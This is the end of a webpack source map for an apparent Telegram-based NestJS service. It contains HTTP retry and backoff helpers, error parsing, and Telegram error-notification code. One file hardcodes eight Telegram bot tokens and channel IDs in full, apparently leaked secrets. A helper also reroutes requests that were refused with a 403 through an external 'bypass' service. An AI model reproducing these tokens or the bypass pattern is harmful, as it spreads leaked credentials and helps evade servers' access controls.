error.message.includes(\"timeout\") ||\r\n                    parsedError.status === 408);\r\n\r\n            if (isTimeout) {\r\n                console.error(`Request timeout (${options.timeout}ms): ${url}`);\r\n                notify(`Timeout on attempt ${attempt}`, {\r\n                    message: `host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n                    status: 408\r\n                });\r\n            } else {\r\n                notify(`Attempt ${attempt} failed`, {\r\n                    message: `host=${host}\\nendpoint=${endpoint}\\n${message.length < 250 ? `msg: ${message}` : \"msg: Message too long\"}`,\r\n                    status: parsedError.status\r\n                });\r\n            }\r\n\r\n            // Handle 403 errors with bypass\r\n            if (parsedError.status === 403) {\r\n                notify(`Attempting bypass for`, { message: `host=${host}\\nendpoint=${endpoint}` });\r\n                try {\r\n                    const bypassResponse = await makeBypassRequest(url, options);\r\n                    notify(`Successfully Excuted 403 Request`, { message: `host=${host}\\nendpoint=${endpoint}` });\r\n                    return bypassResponse;\r\n                } catch (bypassError) {\r\n                    const errorDetails = extractMessage(parseError(bypassError, url, false));\r\n                    notify(`Bypass attempt failed`, `host=${host}\\nendpoint=${endpoint}\\n${errorDetails.length < 250 ? `msg: ${errorDetails}` : \"msg: Message too long\"}`);\r\n                    return undefined;\r\n                }\r\n            }\r\n\r\n            // Enhanced retry condition\r\n            if (attempt < maxRetries && (shouldRetry(error, parsedError) || isRetryableStatus(parsedError.status))) {\r\n                const delay = calculateBackoff(attempt);\r\n                console.log(`Retrying request (${attempt + 1}/${maxRetries}) after ${delay}ms`);\r\n                await sleep(delay);\r\n                continue;\r\n            }\r\n            return undefined;\r\n        }\r\n    }\r\n    const errorData = extractMessage(parseError(lastError, url, false))\r\n    notify(`All ${maxRetries} retries exhausted`, `${errorData.length < 250 ? `msg: ${errorData}` : \"msg: Message too long\"}`);\r\n    return undefined;\r\n}\r\n\r\nasync function makeBypassRequest(url: string, options: AxiosRequestConfig & { bypassUrl?: string }): Promise<AxiosResponse | undefined> {\r\n    if (!options.bypassUrl && !process.env.bypassURL) return undefined;\r\n    options.bypassUrl = options.bypassUrl || `${process.env.bypassURL}/execute-request`;\r\n    return axios.post(options.bypassUrl, {\r\n        url,\r\n        method: options.method,\r\n        headers: options.headers,\r\n        data: options.data,\r\n        params: options.params,\r\n    });\r\n}\r\n\r\nfunction shouldRetry(error: any, parsedError: any): boolean {\r\n    // Network-level errors\r\n    if (axios.isAxiosError(error)) {\r\n        const networkErrors = [\r\n            'ETIMEDOUT',\r\n            'ECONNABORTED',\r\n            'ECONNREFUSED',\r\n            'ECONNRESET',\r\n            'ERR_NETWORK',\r\n            'ERR_BAD_RESPONSE',\r\n            'EHOSTUNREACH',\r\n            'ENETUNREACH'\r\n        ];\r\n\r\n        if (networkErrors.includes(error.code)) {\r\n            return true;\r\n        }\r\n\r\n        if (error.message?.toLowerCase().includes('timeout')) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // HTTP status-based retries\r\n    return isRetryableStatus(parsedError.status);\r\n}\r\n\r\nfunction notify(prefix: string, errorDetails: any) {\r\n    const errorMessage = typeof errorDetails.message === 'string'\r\n        ? errorDetails.message\r\n        : JSON.stringify(errorDetails.message);\r\n\r\n    console.log(prefix, errorDetails);\r\n\r\n    if (errorDetails.status === 429) return;\r\n\r\n    const notificationText = `${prefix}\\n\\n${errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n            errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n                extractMessage(errorDetails?.message)\r\n        }`;\r\n\r\n    try {\r\n        axios.get(`${ppplbot(process.env.httpFailuresChannel)}&text=${encodeURIComponent(notificationText)}`);\r\n    } catch (error) {\r\n        console.error(\"Failed to notify failure:\", error);\r\n    }\r\n}\r\n\r\n// Add new helper functions\r\nfunction isRetryableStatus(status: number): boolean {\r\n    return [408, 500, 502, 503, 504, 429].includes(status);\r\n}\r\n\r\nfunction calculateBackoff(attempt: number): number {\r\n    // Exponential backoff with a lower initial wait time for network issues\r\n    const minDelay = 500; // Start with 500ms\r\n    const maxDelay = 30000; // Cap at 30 seconds\r\n    const base = Math.min(minDelay * Math.pow(2, attempt), maxDelay);\r\n    const jitter = Math.random() * (base * 0.2); // Add up to 20% jitter\r\n    return Math.floor(base + jitter);\r\n}\r\n\r\nfunction shouldTryFetchFallback(error: any): boolean {\r\n    return axios.isAxiosError(error) &&\r\n        [\"ECONNABORTED\", \"ETIMEDOUT\", \"ERR_NETWORK\", \"ECONNREFUSED\"].includes(error.code);\r\n}\r\n\r\nasync function makeFetchRequest(url: string, options: AxiosRequestConfig, signal: AbortSignal): Promise<AxiosResponse> {\r\n    const fetchOptions: RequestInit = {\r\n        method: options.method,\r\n        headers: options.headers as HeadersInit,\r\n        body: options.data ? JSON.stringify(options.data) : undefined,\r\n        signal,\r\n        // Add keep-alive and better connection handling\r\n        keepalive: true,\r\n        credentials: 'same-origin'\r\n    };\r\n\r\n    const response = await fetch(url, fetchOptions);\r\n    let data;\r\n    try {\r\n        data = await response.json();\r\n    } catch (e) {\r\n        // Handle non-JSON responses\r\n        data = await response.text();\r\n    }\r\n\r\n    return {\r\n        data,\r\n        status: response.status,\r\n        statusText: response.statusText,\r\n        headers: Object.fromEntries(response.headers),\r\n        config: options,\r\n    } as AxiosResponse;\r\n}\r\n","const notifbottokens: string[] = [\r\n    '5856546982:AAEW5QCbfb7nFAcmsTyVjHXyV86TVVLcL_g',\r\n    '7628485611:AAECLtviheixcYoEBL_EhfsCegct7lgV-Zk',\r\n    '7940072383:AAHwRu4_4QWqeuC4ZClS9OiSfBOVQ7TvGHw'\r\n];\r\nlet currentNotifTokenIndex = 0;\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const token = botToken || notifbottokens[currentNotifTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentNotifTokenIndex = (currentNotifTokenIndex + 1) % notifbottokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nconst ppplbottokens: string[] = [\r\n    '7281017483:AAGoeVPH98k8rXUpoR22XomfAL7PzMtJVVk',\r\n    '7499764732:AAH3flZUF7J1zwK1xac8fI50lR24WeQAbNo',\r\n    '6735591051:AAELwIkSHegcBIVv5pf484Pn09WNQj1Nl54',\r\n    '6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY',\r\n    '6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA'\r\n];\r\nlet currentPpplTokenIndex = 0;\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const token = botToken || ppplbottokens[currentPpplTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentPpplTokenIndex = (currentPpplTokenIndex + 1) % ppplbottokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { fetchWithTimeout } from \"./fetchWithTimeout\";\r\nimport { notifbot } from \"./logbots\";\r\n\r\nexport const extractMessage = (data: any) => {\r\n  if (Array.isArray(data)) {\r\n    return `${data.map((item) => extractMessage(item)).join('\\n')}`;\r\n  }\r\n\r\n  if (\r\n    typeof data === 'string' ||\r\n    typeof data === 'number' ||\r\n    typeof data === 'boolean'\r\n  ) {\r\n    return data;\r\n  }\r\n\r\n  if (typeof data === 'object' && data !== null) {\r\n    const messages: string[] = [];\r\n\r\n    for (const key in data) {\r\n      const value = data[key];\r\n      const newPrefix = key;\r\n\r\n      if (Array.isArray(value)) {\r\n        messages.push(\r\n          `${newPrefix}=${value.map((item) => extractMessage(item)).join('\\n')}`,\r\n        );\r\n      } else if (\r\n        typeof value === 'string' ||\r\n        typeof value === 'number' ||\r\n        typeof value === 'boolean'\r\n      ) {\r\n        messages.push(`${newPrefix}=${value}`);\r\n      } else if (typeof value === 'object' && value !== null) {\r\n        messages.push(String(extractMessage(value)));\r\n      }\r\n    }\r\n\r\n    return messages.length > 0 ? messages.join('\\n') : '';\r\n  }\r\n\r\n  return ''; // Return empty string for null, undefined, and unhandled types\r\n};\r\n\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true\r\n): {\r\n  status: number;\r\n  message: string;\r\n  error: any;\r\n} {\r\n  const clientId = process.env.clientId || 'UnknownClient';\r\n  const notifChannel = process.env.notifChannel || 'UnknownChannel';\r\n  const prefixStr = `${clientId} - ${prefix || ''}`;\r\n  let status: number = 500;\r\n  let message = 'An unknown error occurred';\r\n  let error: any = 'UnknownError';\r\n\r\n  // Handle the case where `err` is undefined\r\n  if (!err) {\r\n    message = 'No error object provided';\r\n    error = 'NoErrorObject';\r\n  } else if (err.response) {\r\n    const response = err.response;\r\n    status =\r\n      response.data?.statusCode ||\r\n      response.data?.status ||\r\n      response.data?.ResponseCode ||\r\n      response.status ||\r\n      err.status ||\r\n      500;\r\n    message =\r\n      response.data?.message ||\r\n      response.data?.errors ||\r\n      response.data?.ErrorMessage ||\r\n      response.data?.errorMessage ||\r\n      response.data?.UserMessage ||\r\n      response.data ||\r\n      response.message ||\r\n      response.statusText ||\r\n      err.message ||\r\n      'An error occurred';\r\n    error =\r\n      response.data?.error || response.error || err.name || err.code || 'Error';\r\n  } else if (err.request) {\r\n    status = err.status || 408;\r\n    message =\r\n      err.data?.message ||\r\n      err.data?.errors ||\r\n      err.data?.ErrorMessage ||\r\n      err.data?.errorMessage ||\r\n      err.data?.UserMessage ||\r\n      err.data ||\r\n      err.message ||\r\n      err.statusText ||\r\n      'The request was triggered but no response was received';\r\n    error = err.name || err.code || 'NoResponseError';\r\n  } else if (err.message) {\r\n    status = err.status || 500;\r\n    message = err.message;\r\n    error = err.name || err.code || 'Error';\r\n  }\r\n\r\n  const fullMessage = `${prefixStr} :: ${extractMessage(message)}`;\r\n  const response = { status, message: err.errorMessage ? err.errorMessage : String(fullMessage), error };\r\n  console.log(\"parsedErr: \", fullMessage);\r\n  if (sendErr) {\r\n    try {\r\n      const shouldSend = !fullMessage.includes(\"INPUT_USER_DEACTIVATED\") &&\r\n        status.toString() !== \"429\" &&\r\n        !fullMessage.toLowerCase().includes(\"too many req\") &&\r\n        !fullMessage.toLowerCase().includes('could not find') &&\r\n        !fullMessage.includes('ECONNREFUSED');\r\n\r\n      if (shouldSend) {\r\n        const encodedMessage = encodeURIComponent(response.message);\r\n        const notifUrl = `${notifbot()}&text=${encodedMessage}`;\r\n        fetchWithTimeout(notifUrl);\r\n      }\r\n    } catch (fetchError) {\r\n      console.error('Failed to send error notification:', fetchError);\r\n    }\r\n  }\r\n  return response;\r\n}","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"https\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"fs\");","module.exports = require(\"http\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(\"./src/main.ts\");\n",""],"names":[],"sourceRoot":""}